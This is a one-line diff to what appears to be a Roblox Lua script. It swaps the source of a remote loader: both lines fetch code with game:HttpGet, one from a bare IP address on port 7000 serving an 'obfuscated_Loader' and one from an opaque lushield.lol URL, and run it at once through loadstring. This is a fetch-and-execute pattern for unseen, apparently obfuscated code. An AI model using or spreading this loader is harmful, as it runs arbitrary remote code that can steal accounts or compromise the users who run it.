@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://194.13.80.145:7000/raw/1768317549077-obfuscated_Loader%20(1).lua"))()
+loadstring(game:HttpGet("https://lushield.lol/raw/608234d5-418c-4c6b-b65d-dc36373f2fd3"))()
